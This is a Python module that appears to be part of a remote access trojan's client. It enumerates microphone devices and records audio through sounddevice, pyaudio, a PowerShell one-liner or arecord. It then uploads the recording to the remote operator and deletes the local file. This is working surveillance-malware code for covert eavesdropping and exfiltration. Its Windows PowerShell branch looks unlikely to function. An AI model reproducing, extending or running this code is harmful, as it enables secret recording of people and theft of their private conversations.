import os
import subprocess


def list_audio_devices(protocol):
    try:
        import sounddevice as sd
        devices = [(d['name'], d['max_input_channels']) for d in sd.query_devices()
                   if d['max_input_channels'] > 0]
        if devices:
            protocol.send('[+] Input devices:\n' + '\n'.join(
                f'  {n} (channels: {c})' for n, c in devices))
            return
    except Exception:
        pass
    protocol.send('[-] Could not enumerate audio devices (install sounddevice or pyaudio)')


def _record_pyaudio(fpath, duration):
    import pyaudio
    import wave
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100,
                    input=True, frames_per_buffer=1024)
    frames = [stream.read(1024) for _ in range(int(44100 / 1024 * duration))]
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(fpath, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()


def _record_sounddevice(fpath, duration):
    import sounddevice as sd
    import wave
    fs = 44100
    data = sd.rec(int(fs * duration), samplerate=fs, channels=1, dtype='int16')
    sd.wait()
    wf = wave.open(fpath, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(2)
    wf.setframerate(fs)
    wf.writeframes(data.tobytes())
    wf.close()


def record_audio(protocol, duration_sec=10):
    fpath = 'mic_capture.wav'
    try:
        _record_sounddevice(fpath, duration_sec)
    except Exception:
        try:
            _record_pyaudio(fpath, duration_sec)
        except Exception:
            try:
                if os.name == 'nt':
                    ps = (f'$d=New-Object System.TimeSpan -ArgumentList 0,0,{duration_sec};'
                          f'$r=New-Object Windows.Media.Capture.MediaRecorder;'
                          f'$r.StartRecordToFileAsync("{fpath}");'
                          f'Start-Sleep -Seconds {duration_sec};$r.StopRecordAsync()')
                    subprocess.run(['powershell', '-NoP', '-C', ps], capture_output=True, timeout=duration_sec + 10)
                else:
                    subprocess.run(['arecord', '-d', str(duration_sec), '-f', 'cd', '-t', 'wav', fpath],
                                   capture_output=True, timeout=duration_sec + 5)
            except Exception as e:
                protocol.send(f'[-] Audio recording failed: {str(e)}')
                return
    try:
        from client.modules.file_ops import upload_file
        upload_file(protocol, fpath)
        os.remove(fpath)
    except Exception as e:
        protocol.send(f'[-] Upload failed: {str(e)}')
